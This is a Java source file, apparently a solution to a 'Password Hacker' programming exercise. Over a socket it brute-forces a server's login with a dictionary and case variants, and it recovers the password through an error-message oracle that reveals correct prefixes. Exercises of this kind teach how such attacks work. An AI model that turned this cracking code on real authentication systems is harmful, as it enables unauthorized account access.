package hacker.main;

import com.google.gson.Gson;
import hacker.json.LoginPasswordPair;
import hacker.json.ServerResponse;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

import static hacker.data.Config.LOGINS_DIRECTORY;
import static hacker.data.Config.PASSWORDS_DIRECTORY;
import static hacker.main.Main.Responses.*;

public class Main {
     enum Responses {
        WRONG_LOGIN("Wrong login!"), WRONG_PASSWORD("Wrong password!"), BAD("Bad request!"), EXCEPTION("Exception happened during login"), SUCCESS("Connection success!");

        private final String message;
            
        Responses(String message) {
            this.message = message;
        }

        private String getMessage() {
            return message;
        }
    }

    public static void main(String[] args) throws IOException {
         /*





         IMPORTANT!!!
         Make sure to add Gson as a dependency each time you load IntelliJ. build.gradle is at C:\Users\andre\IdeaProjects\Password Hacker (Java)\build.gradle





          */
        String ipAddress = args[0]; int port = Integer.parseInt(args[1]);
        try (Socket socket = new Socket(ipAddress, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
            Gson gson = new Gson();
            String login = bruteForceLoginUsingDictionary(input, output).orElse("Login not found");
            String password = findPasswordUsingVulnerability(login, input, output).orElse("Password not found.");
            System.out.println(gson.toJson(new LoginPasswordPair(login, password)));
        }
    }

    /**
     * Brute force the login using the dictionary of logins.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return an Optional containing either the correct login or nothing
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input, DataOutputStream output) throws IOException {
        try (Reader reader = new FileReader(LOGINS_DIRECTORY)) {
            // Holds the current login being checked from passwords.txt
            StringBuilder commonLoginBuilder = new StringBuilder();
            // Holds each char that is read, used in the while loop
            int i;
            while ((i = reader.read()) != -1) {
                // Current character being read
                char currentCharacter = (char) i;
                // Checking for whitespace/linebreak
                if (Character.toString(currentCharacter).matches("\\s")) {
                    String commonLogin = commonLoginBuilder.toString();
                    // Doesn't need to try case combinations if the password is a number
                    if (commonLogin.matches("[0-9]+")) {
                        output.writeUTF(commonLogin);
                        // When it says wrong password, that means the login is correct
                        if (WRONG_PASSWORD.getMessage().equals(input.readUTF())) {
                            return Optional.of(commonLogin);
                        }
                    } else {
                        List<LoginPasswordPair> allCaseCombinations = generateCaseList(commonLogin, 1);
                        Optional<String> possibleCorrectLogin = tryListOfLoginPasswordPairs(allCaseCombinations, 1, input, output);
                        if (possibleCorrectLogin.isPresent()) {
                            return possibleCorrectLogin;
                        }
                    }
                    commonLoginBuilder = new StringBuilder();
                } else {
                    commonLoginBuilder.append(currentCharacter);
                }
            }
        }
        return Optional.empty();
    }

    /**
     * Finds the password using the vulnerability in stage 4 where an inputted password that matches the beginning of the correct password will return an exception
     * message.
     * @param login the correct login to use when finding the password
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return an Optional containing either the correct password or nothing
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> findPasswordUsingVulnerability(String login, DataInputStream input, DataOutputStream output) throws IOException {
         StringBuilder attemptedPasswordBuilder = new StringBuilder("a");
         int currentLength = 1;
         // The character which is being changed to try to find the password
         char volatileChar = 'a';
        while (true) {
            // 0 without apostrophes is null
            if (volatileChar == 0) {
                return Optional.empty();
            } else {
                attemptedPasswordBuilder.replace(currentLength - 1, currentLength, String.valueOf(volatileChar));
                ServerResponse response = tryLoginPasswordPair(new LoginPasswordPair(login, attemptedPasswordBuilder.toString()), input, output);
                if (response.getResult().equals(SUCCESS.getMessage())) {
                    return Optional.of(attemptedPasswordBuilder.toString());
                } else if (response.getResult().equals(EXCEPTION.getMessage())) {
                    ++currentLength;
                    attemptedPasswordBuilder.append("a");
                    volatileChar = 'a';
                } else {
                    volatileChar = vulnerabilityNextCharacter(volatileChar);
                }
            }
        }
    }

    /**
     * Get the next character for use with the stage 4 vulnerability
     * @param character the character from which to get the next character
     * @return the next character
     */
    private static char vulnerabilityNextCharacter(char character) {
        // When going to the next character, it goes from a-z to A-Z to 0-9 and lastly to ascii code of 0, which is null
         if (character == 'z') {
             return 'A';
         } else if (character == 'Z') {
             return '0';
         } else if (character == '9' || character == 0) {
             return 0;
         }
         return (char) (character + 1);
    }

    /**
     * Brute forces the password using the provided dictionary of passwords in passwords.txt. Also tries all possible combinations of cases of each password.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return either an empty Optional or an Optional containing the correct password
     * @throws IOException if something goes wrong with the input/output of data
     */
    @Deprecated
    private static Optional<String> bruteForcePasswordUsingDictionary(String login, DataInputStream input, DataOutputStream output) throws IOException {
        try (Reader reader = new FileReader(PASSWORDS_DIRECTORY)) {
            // Holds the current password being checked from passwords.txt
            StringBuilder commonPasswordBuilder = new StringBuilder();
            // Holds each char that is read, used in the while loop
            int i;
            while ((i = reader.read()) != -1) {
                // Current character being read
                char currentCharacter = (char) i;
                // Checking for whitespace/linebreak
                if (Character.toString(currentCharacter).matches("\\s")) {
                    String commonPassword = commonPasswordBuilder.toString();
                    // Doesn't need to try case combinations if the password is a number
                    if (commonPassword.matches("[0-9]+")) {
                        output.writeUTF(commonPassword);
                        if (SUCCESS.getMessage().equals(input.readUTF())) {
                            return Optional.of(commonPassword);
                        }
                    } else {
                        BinaryFilter filter = new BinaryFilter(commonPassword.length());
                        String[] allCaseCombinations = filter.modifyStringAllCombinations(commonPassword, Character::toUpperCase);
                        Optional<String> possibleCorrectPassword = tryArrayOfPasswords(login, allCaseCombinations, input, output);
                        if (possibleCorrectPassword.isPresent()) {
                            return possibleCorrectPassword;
                        }
                    }
                    commonPasswordBuilder = new StringBuilder();
                    // REMOVE THIS LATER
                } else {
                    commonPasswordBuilder.append(currentCharacter);
                }
            }
        }
        return Optional.empty();
    }

    /**
     * Takes a login password pair object and sends it to the sever, then returns the server response for that pair.
     * @param pair the pair object to be sent
     * @param input the input stream to which to respond if the pair was correct or not
     * @param output the output stream to which to send the attempted pair
     * @return the response from the server
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static ServerResponse tryLoginPasswordPair(LoginPasswordPair pair, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        String json = gson.toJson(pair, LoginPasswordPair.class);
        output.writeUTF(json);
        return gson.fromJson(input.readUTF(), ServerResponse.class);
    }

    /**
     * Takes a list of login password pairs and, if the mode is 1, returns the correct login or an empty Optional, or if the mode is 2, returns the correct password/beginning
     * of the correct password or an empty Optional.
     * @param pairs the list of pairs to try
     * @param mode the mode of the method. 1 looks for the correct login, 2 looks for the correct password/beginning of the correct password
     * @param input the input stream to which to respond if the pair was correct or not
     * @param output the output stream to which to send the attempted pair
     * @return an Optional corresponding with the mode
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> tryListOfLoginPasswordPairs(List<LoginPasswordPair> pairs, int mode, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        for (LoginPasswordPair pair : pairs) {
            String json = gson.toJson(pair, LoginPasswordPair.class);
            output.writeUTF(json);
            String response = gson.fromJson(input.readUTF(), ServerResponse.class).getResult();
            switch (mode) {
                // Finding login
                case 1:
                    if (response.equals(WRONG_PASSWORD.getMessage())) {
                        return Optional.of(pair.getLogin());
                    }
                // Finding password
                case 2:
                    if (response.equals(EXCEPTION.getMessage()) || response.equals(SUCCESS.getMessage())) {
                        return Optional.of(pair.getPassword());
                    }
            }
        }
        return Optional.empty();
    }

    /**
     * Takes a string array of passwords and sends each password to the provided output stream, testing if it is correct.
     * @param passwords the string array of passwords to be tested
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return either an empty Optional or an Optional containing the correct password
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> tryArrayOfPasswords(String login, String[] passwords, DataInputStream input, DataOutputStream output) throws IOException {
        for (String password : passwords) {
            Gson gson = new Gson();
            String json = gson.toJson(new LoginPasswordPair(login, password), LoginPasswordPair.class);
            output.writeUTF(json);
            if (SUCCESS.getMessage().equals(input.readUTF())) {
                return Optional.of(password);
            }
        }
        return Optional.empty();
    }

    /**
     * Takes a String value as input,
     * can be either a login or a password, and 1 or 2 as a mode, 1 being for login and 2 being for password,
     * and returns a list of login pairs
     * containing all case variations of the passed value in the corresponding spot.
     * @param value the value, either login or password, to get case variations of
     * @param mode generates variants of either the login or the password, 1 generates login variants, 2 generates password variants
     * @return the list of login pairs containing all case variations of the value
     */
    private static List<LoginPasswordPair> generateCaseList(String value, int mode) {
        BinaryFilter filter = new BinaryFilter(value.length());
        return switch (mode) {
            // Login
            case 1 ->
                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair(x, "a")).toList();
            // Password
            case 2 ->
                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair("a", x)).toList();
            default -> generateCaseList(value, 1);
        };
    }

    /**
     * Tries to brute force all possible passwords.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return the correct password once it is found
     * @throws IOException if something goes wrong with the input/output of data
     */
    @Deprecated
    private static String bruteForce(DataInputStream input, DataOutputStream output) throws IOException {
        List<Character> passwordAttempt = new ArrayList<>();
        passwordAttempt.add('`');
        infiniteloop:
        while (true) {
            // Check if any part of the password needs to cycle back to "a"
            if (passwordAttempt.get(passwordAttempt.size() - 1) == '9') {
                // Iterating backwards until it finds the character which is not equal to 9 and sets it to the next character
                for (int i = passwordAttempt.size() - 1; i >= 0; i--) {
                    if (passwordAttempt.get(i) != '9') {
                        passwordAttempt.set(i, nextCharacter(passwordAttempt.get(i)));
                        // Sets all the characters after the found one to "a"
                        for (int j = passwordAttempt.size() - 1; j > i; j--) {
                            passwordAttempt.set(j, 'a');
                        }
                        continue infiniteloop;
                    }
                }
                // If the loop finds none of them to be not equal to 9, then the password attempt needs to be extended
                passwordAttempt.add('a');
                passwordAttempt = passwordAttempt.stream().map(x -> 'a').collect(Collectors.toList());
            } else {
                passwordAttempt.set(passwordAttempt.size() - 1, nextCharacter(passwordAttempt.get(passwordAttempt.size() - 1)));
            }
            String sentPassword = joinList(passwordAttempt);
            output.writeUTF(sentPassword);
            if (SUCCESS.getMessage().equals(input.readUTF())) {
                return sentPassword;
            }
        }
    }

    /**
     * Returns the next character to be checked in the next iteration of the cycle when brute forcing all combinations.
     * @param previousCharacter the previous character which is being changed
     * @return the next character to be checked
     */
    @Deprecated
    private static char nextCharacter(char previousCharacter) {
        if (previousCharacter == 'z') {
            return '0';
        }
        return (char) (previousCharacter + 1);
    }

    /**
     * Takes a char list and returns a string containing the contents of the list in the same order.
     * @param array the char list to be joined
     * @return the joined list
     */
    @Deprecated
    private static <T> String joinList(List<T> array) {
        StringBuilder sentPassword = new StringBuilder();
        array.forEach(x -> sentPassword.append(x.toString()));
        return sentPassword.toString();
    }
}
